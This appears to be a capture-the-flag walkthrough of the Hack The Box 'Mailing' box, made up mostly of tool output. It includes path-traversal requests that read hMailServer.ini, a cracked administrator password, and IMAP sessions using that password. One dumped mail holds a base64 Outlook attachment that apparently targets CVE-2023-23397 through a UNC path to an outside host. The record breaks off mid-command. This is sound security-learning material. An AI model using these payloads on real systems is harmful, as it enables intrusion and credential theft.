# Mailing

## Initial Nmap Scan

```
Nmap scan report for 10.10.11.14
Host is up (0.067s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
25/tcp  open  smtp          hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to http://mailing.htb
110/tcp open  pop3          hMailServer pop3d
|_pop3-capabilities: TOP UIDL USER
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp open  imap          hMailServer imapd
|_imap-capabilities: ACL CAPABILITY IMAP4 IMAP4rev1 IDLE completed NAMESPACE CHILDREN QUOTA OK SORT RIGHTS=texkA0001
445/tcp open  microsoft-ds?
465/tcp open  ssl/smtp      hMailServer smtpd
| smtp-commands: mailing.htb, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
587/tcp open  smtp          hMailServer smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
| smtp-commands: mailing.htb, SIZE 20480000, STARTTLS, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
993/tcp open  ssl/imap      hMailServer imapd
|_imap-capabilities: ACL CAPABILITY IMAP4 IMAP4rev1 IDLE completed NAMESPACE CHILDREN QUOTA OK SORT RIGHTS=texkA0001
| ssl-cert: Subject: commonName=mailing.htb/organizationName=Mailing Ltd/stateOrProvinceName=EU\Spain/countryName=EU
| Not valid before: 2024-02-27T18:24:10
|_Not valid after:  2029-10-06T18:24:10
|_ssl-date: TLS randomness does not represent time
Service Info: Host: mailing.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2024-05-04T19:04:31
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 75.65 seconds
```

## Web Server

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

* "Powered by hMailServer"

## Searchsploit

```
❯ searchsploit hmailserver
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
hMAilServer 4.4.1 - IMAP Command Remote Denial of Service           | windows/dos/32229.txt
hMAilServer 4.4.2 - 'PHPWebAdmin' File Inclusion                    | php/webapps/7012.txt
hMAilServer 5.3.3 - IMAP Remote Crash (PoC)                         | windows/dos/22302.rb
-------------------------------------------------------------------- ---------------------------------
```

* Would be a good idea to figure out what version its running.

## Webpage Source Code

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

* The download link for the instructions goes to download.php?file=
  * There may be a file inclusion vulnerability.

## Burp

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

```
../../windows/system32/drivers/etc/hosts
```

```
/download.php?file=../../program+files+(x86)\hMailServer\Bin\hMailServer.ini 
```

```
HTTP/1.1 200 OK
Cache-Control: must-revalidate
Pragma: public
Content-Type: application/octet-stream
Expires: 0
Server: Microsoft-IIS/10.0
X-Powered-By: PHP/8.3.3
Content-Description: File Transfer
Content-Disposition: attachment; filename="hMailServer.ini"
X-Powered-By: ASP.NET
Date: Sat, 04 May 2024 23:42:00 GMT
Connection: close
Content-Length: 604

[Directories]
ProgramFolder=C:\Program Files (x86)\hMailServer
DatabaseFolder=C:\Program Files (x86)\hMailServer\Database
DataFolder=C:\Program Files (x86)\hMailServer\Data
LogFolder=C:\Program Files (x86)\hMailServer\Logs
TempFolder=C:\Program Files (x86)\hMailServer\Temp
EventFolder=C:\Program Files (x86)\hMailServer\Events
[GUILanguages]
ValidLanguages=english,swedish
[Security]
AdministratorPassword=841bb5acfa6779ae432fd7a4e6600ba7
[Database]
Type=MSSQLCE
Username=
Password=0a9f8ad8bf896b501dde74f08efd7e4c
PasswordEncryption=1
Port=0
Server=
Database=hMailServer
Internal=1

```

### Crackstation - free password hash cracker

<figure><img src=".gitbook/assets/image (33).png" alt=""><figcaption><p><a href="https://crackstation.net/">https://crackstation.net/</a></p></figcaption></figure>

`homenetworkingadministrator`

## Imap

```
❯ curl -k -v 'imaps://mailing.htb' --user administrator@mailing.htb:homenetworkingadministrator
* Host mailing.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.14
*   Trying 10.10.11.14:993...
* Connected to mailing.htb (10.10.11.14) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / RSASSA-PSS
* Server certificate:
*  subject: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  start date: Feb 27 18:24:10 2024 GMT
*  expire date: Oct  6 18:24:10 2029 GMT
*  issuer: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
< * OK IMAPrev1
> A001 CAPABILITY
< * CAPABILITY IMAP4 IMAP4rev1 CHILDREN IDLE QUOTA SORT ACL NAMESPACE RIGHTS=texk
< A001 OK CAPABILITY completed
> A002 LOGIN administrator@mailing.htb homenetworkingadministrator
< A002 OK LOGIN completed
> A003 LIST "" *
< * LIST (\HasNoChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX"
< * LIST (\HasNoChildren) "." "Trash"
* LIST (\HasNoChildren) "." "Trash"
< * LIST (\HasNoChildren) "." "Sent"
* LIST (\HasNoChildren) "." "Sent"
< A003 OK LIST completed
```

```
curl -k -v 'imaps://mailing.htb' --user administrator@mailing.htb:homenetworkingadministrator -X 'LIST INBOX *'
* Host mailing.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.14
*   Trying 10.10.11.14:993...
* Connected to mailing.htb (10.10.11.14) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / RSASSA-PSS
* Server certificate:
*  subject: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  start date: Feb 27 18:24:10 2024 GMT
*  expire date: Oct  6 18:24:10 2029 GMT
*  issuer: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
< * OK IMAPrev1
> A001 CAPABILITY
< * CAPABILITY IMAP4 IMAP4rev1 CHILDREN IDLE QUOTA SORT ACL NAMESPACE RIGHTS=texk
< A001 OK CAPABILITY completed
> A002 LOGIN administrator@mailing.htb homenetworkingadministrator
< A002 OK LOGIN completed
> A003 LIST INBOX *
< * LIST (\HasNoChildren) "." "INBOX"
* LIST (\HasNoChildren) "." "INBOX"
< A003 OK LIST completed
* Connection #0 to host mailing.htb left intact
```

```
curl -k -v 'imaps://mailing.htb' --user administrator@mailing.htb:homenetworkingadministrator -X 'SELECT Trash'
* Host mailing.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.14
*   Trying 10.10.11.14:993...
* Connected to mailing.htb (10.10.11.14) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / RSASSA-PSS
* Server certificate:
*  subject: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  start date: Feb 27 18:24:10 2024 GMT
*  expire date: Oct  6 18:24:10 2029 GMT
*  issuer: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
< * OK IMAPrev1
> A001 CAPABILITY
< * CAPABILITY IMAP4 IMAP4rev1 CHILDREN IDLE QUOTA SORT ACL NAMESPACE RIGHTS=texk
< A001 OK CAPABILITY completed
> A002 LOGIN administrator@mailing.htb homenetworkingadministrator
< A002 OK LOGIN completed
> A003 SELECT Trash
< * 0 EXISTS
* 0 EXISTS
< * 0 RECENT
* 0 RECENT
< * FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
< * OK [UIDVALIDITY 1714936669] current uidvalidity
* OK [UIDVALIDITY 1714936669] current uidvalidity
< * OK [UIDNEXT 1] next uid
* OK [UIDNEXT 1] next uid
< * OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
< A003 OK [READ-WRITE] SELECT completed
* Connection #0 to host mailing.htb left intact
```

```
curl -k -v 'imaps://mailing.htb' --user administrator@mailing.htb:homenetworkingadministrator -X 'SELECT Sent'
* Host mailing.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.14
*   Trying 10.10.11.14:993...
* Connected to mailing.htb (10.10.11.14) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / RSASSA-PSS
* Server certificate:
*  subject: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  start date: Feb 27 18:24:10 2024 GMT
*  expire date: Oct  6 18:24:10 2029 GMT
*  issuer: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
< * OK IMAPrev1
> A001 CAPABILITY
< * CAPABILITY IMAP4 IMAP4rev1 CHILDREN IDLE QUOTA SORT ACL NAMESPACE RIGHTS=texk
< A001 OK CAPABILITY completed
> A002 LOGIN administrator@mailing.htb homenetworkingadministrator
< A002 OK LOGIN completed
> A003 SELECT Sent
< * 2 EXISTS
* 2 EXISTS
< * 2 RECENT
* 2 RECENT
< * FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
* FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
< * OK [UIDVALIDITY 1714938065] current uidvalidity
* OK [UIDVALIDITY 1714938065] current uidvalidity
< * OK [UIDNEXT 3] next uid
* OK [UIDNEXT 3] next uid
< * OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
* OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
< A003 OK [READ-WRITE] SELECT completed
* Connection #0 to host mailing.htb left intact
```

```
❯ curl -k -v 'imaps://mailing.htb/Sent' --user administrator@mailing.htb:homenetworkingadministrator -X 'SEARCH ALL '
* Host mailing.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.14
*   Trying 10.10.11.14:993...
* Connected to mailing.htb (10.10.11.14) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / RSASSA-PSS
* Server certificate:
*  subject: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  start date: Feb 27 18:24:10 2024 GMT
*  expire date: Oct  6 18:24:10 2029 GMT
*  issuer: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
< * OK IMAPrev1
> A001 CAPABILITY
< * CAPABILITY IMAP4 IMAP4rev1 CHILDREN IDLE QUOTA SORT ACL NAMESPACE RIGHTS=texk
< A001 OK CAPABILITY completed
> A002 LOGIN administrator@mailing.htb homenetworkingadministrator
< A002 OK LOGIN completed
> A003 SELECT Sent
< * 2 EXISTS
< * 0 RECENT
< * FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
< * OK [UIDVALIDITY 1714938065] current uidvalidity
< * OK [UIDNEXT 3] next uid
< * OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
< A003 OK [READ-WRITE] SELECT completed
> A004 SEARCH ALL
< * SEARCH 1 2
* SEARCH 1 2
< A004 OK Search completed
* Connection #0 to host mailing.htb left intact
❯ curl -k -v 'imaps://mailing.htb/Sent' --user administrator@mailing.htb:homenetworkingadministrator -X 'FETCH 1 (BODY[TEXT])'
* Host mailing.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.14
*   Trying 10.10.11.14:993...
* Connected to mailing.htb (10.10.11.14) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / RSASSA-PSS
* Server certificate:
*  subject: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  start date: Feb 27 18:24:10 2024 GMT
*  expire date: Oct  6 18:24:10 2029 GMT
*  issuer: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
< * OK IMAPrev1
> A001 CAPABILITY
< * CAPABILITY IMAP4 IMAP4rev1 CHILDREN IDLE QUOTA SORT ACL NAMESPACE RIGHTS=texk
< A001 OK CAPABILITY completed
> A002 LOGIN administrator@mailing.htb homenetworkingadministrator
< A002 OK LOGIN completed
> A003 SELECT Sent
< * 2 EXISTS
< * 0 RECENT
< * FLAGS (\Deleted \Seen \Draft \Answered \Flagged)
< * OK [UIDVALIDITY 1714938065] current uidvalidity
< * OK [UIDNEXT 3] next uid
< * OK [PERMANENTFLAGS (\Deleted \Seen \Draft \Answered \Flagged)] limited
< A003 OK [READ-WRITE] SELECT completed
> A004 FETCH 1 (BODY[TEXT])
< * 1 FETCH (BODY[TEXT] {6755}
* 1 FETCH (BODY[TEXT] {6755}
< This is a multi-part message in MIME format.
< --------------Lb7wTIQE4fjDsPIOHX6z5etN
< Content-Type: text/plain; charset=UTF-8; format=flowed
< Content-Transfer-Encoding: 7bit
<
< click it bro
<
< --------------Lb7wTIQE4fjDsPIOHX6z5etN
< Content-Type: application/octet-stream; name="appointment.msg"
< Content-Disposition: attachment; filename="appointment.msg"
< Content-Transfer-Encoding: base64
<
< 0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAABAAAAAwAAAAAA
< AAAAEAAAAgAAAAEAAAD+////AAAAAAcAAAD/////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< //////////////////////////////////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAMADTQGAAAA/r+hAAAAAAAeABoABgAAABAAAAAAAAAAHgA3AAYAAAAPAAAAAAAAAB4A
< ABAGAAAAEgAAAAAAAAAeAACABgAAABAAAAAAAAAACwABgAYAAAABAAAAAAAAAEAAAoAGAAAA
< gI3aQfGe2gFAAAOABgAAAICN2kHxntoBHgAEgAYAAAAGAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AABQYXJpcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAXFwxMC4xMC4xNC4xMTJcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6CAAAIAAMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAANggAACAACAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIIAAAgABAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgg
< BgAAAAAAwAAAAAAAAEYCIAYAAAAAAMAAAAAAAABGAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAfhQAABgAAAByFAAAGAAEADYIAAAgAAgAOggAACAADAAiCAAAIAAQAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAH4UAAAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAByFAAAGAAEAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABJUE0uQXBwb2ludG1lbnQA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQ1ZFLTIw
< MjMtMjMzOTcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAE5ldyBtZWV0aW5nIG5vdyAhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAIggAACAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAIAAAD+/////v////7////+/////v////7/
< ///+/////v////7////+/////v////7////+////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< //////////////////////////////////////////////////////////////////9SAG8A
< bwB0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAACgAFAP//////////AQAAAAsNAgAAAAAAwAAAAAAAAEYAAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAADAAwAAAAAAAF8AXwBzAHUAYgBzAHQAZwAxAC4AMABfADEAMAAwADAAMAAwADEA
< RQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAIBAgAAAA0AAAD/////AAAAAAAAAAAAAAAA
< AAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBDgAAABEAAAAAAAAAXwBfAHMAdQBiAHMAdABnADEA
< LgAwAF8AMAAwADMANwAwADAAMQBFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACoAAgEDAAAA
< //////////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN2kHxntoBgI3aQfGe2gENAAAADgAAAAAA
< AABfAF8AcwB1AGIAcwB0AGcAMQAuADAAXwAwADAAMQBBADAAMAAxAEUAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAKgACAQQAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAAgI3aQfGe
< 2gGAjdpB8Z7aAQwAAAAPAAAAAAAAAF8AXwBuAGEAbQBlAGkAZABfAHYAZQByAHMAaQBvAG4A
< MQAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAoAAEB//////////8FAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBAAAAAAAAAAAAAAAAXwBfAHMAdQBiAHMA
< dABnADEALgAwAF8AMQAwADAANQAwADEAMAAyAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACoA
< AgAGAAAACgAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN2kHxntoBgI3aQfGe2gELAAAA
< CAAAAAAAAABfAF8AcwB1AGIAcwB0AGcAMQAuADAAXwAxADAAMAA0ADAAMQAwADIAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAAAAAKgACAAcAAAD//////////wAAAAAAAAAAAAAAAAAAAAAAAAAA
< gI3aQfGe2gGAjdpB8Z7aAQoAAAAIAAAAAAAAAF8AXwBzAHUAYgBzAHQAZwAxAC4AMABfADAA
< MAAwADQAMAAxADAAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAIACAAAAP//////////
< AAAAAAAAAAAAAAAAAAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBAAAAAAAAAAAAAAAAXwBfAHMA
< dQBiAHMAdABnADEALgAwAF8AMAAwADAAMwAwADEAMAAyAAAAAAAAAAAAAAAAAAAAAAAAAAAA
< AAAAACoAAgAJAAAA//////////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN2kHxntoBgI3aQfGe
< 2gEJAAAAKAAAAAAAAABfAF8AcwB1AGIAcwB0AGcAMQAuADAAXwAwADAAMAAyADAAMQAwADIA
< AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgACAP///////////////wAAAAAAAAAAAAAAAAAA
< AAAAAAAAgI3aQfGe2gGAjdpB8Z7aAQgAAAAgAAAAAAAAAF8AXwBzAHUAYgBzAHQAZwAxAC4A
< MABfADEAMAAxADEAMAAxADAAMgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAIA/////wsA
< AAD/////AAAAAAAAAAAAAAAAAAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBBwAAAAgAAAAAAAAA
< XwBfAHMAdQBiAHMAdABnADEALgAwAF8AMQAwADEANgAwADEAMAAyAAAAAAAAAAAAAAAAAAAA
< AAAAAAAAAAAAACoAAgD/////DAAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN2kHxntoB
< gI3aQfGe2gEGAAAACAAAAAAAAABfAF8AcwB1AGIAcwB0AGcAMQAuADAAXwAxADAAMQA3ADAA
< MQAwADIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKgACAP///////////////wAAAAAAAAAA
< AAAAAAAAAAAAAAAAgI3aQfGe2gGAjdpB8Z7aAQUAAAAIAAAAAAAAAF8AXwBzAHUAYgBzAHQA
< ZwAxAC4AMABfADgAMAAwADAAMAAwADEARQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAqAAIB
< /////w4AAAD/////AAAAAAAAAAAAAAAAAAAAAAAAAACAjdpB8Z7aAYCN2kHxntoBBAAAAA8A
< AAAAAAAAXwBfAHMAdQBiAHMAdABnADEALgAwAF8AOAAwADAANAAwADAAMQBFAAAAAAAAAAAA
< AAAAAAAAAAAAAAAAAAAAACoAAgH/////DwAAAP////8AAAAAAAAAAAAAAAAAAAAAAAAAAICN
< 2kHxntoBgI3aQfGe2gEDAAAABQAAAAAAAABfAF8AcAByAG8AcABlAHIAdABpAGUAcwBfAHYA
< ZQByAHMAaQBvAG4AMQAuADAAAAAAAAAAAAAAAAAAAAAAAAAAMAACAf///////////////wAA
< AAAAAAAAAAAAAAAAAAAAAAAAgI3aQfGe2gGAjdpB8Z7aAQAAAACwAAAAAAAAAAEAAAD+////
< /v///wQAAAAFAAAABgAAAP7////9////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////////////////////////////////////////////////////
< ////////////////////////
<
< --------------Lb7wTIQE4fjDsPIOHX6z5etN--
< )
< A004 OK FETCH completed
* Connection #0 to host mailing.htb left intact

```

```
❯ curl -k -v 'imaps://mailing.htb/Sent' --user administrator@mailing.htb:homenetworkingadministrator -X 'FETCH 2 (BODY[TEXT])'
* Host mailing.htb:993 was resolved.
* IPv6: (none)
* IPv4: 10.10.11.14
*   Trying 10.10.11.14:993...
* Connected to mailing.htb (10.10.11.14) port 993
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384 / secp256r1 / RSASSA-PSS
* Server certificate:
*  subject: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  start date: Feb 27 18:24:10 2024 GMT
*  expire date: Oct  6 18:24:10 2029 GMT
*  issuer: C=EU; ST=EU\Spain; L=Madrid; O=Mailing Ltd; OU=MAILING; CN=mailing.htb; emailAddress=ruy@mailing.htb
*  SSL certificate verify result: self-signed certificate (18), continuing anyway.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
< * OK IMAPrev1
> A001 CAPABILITY
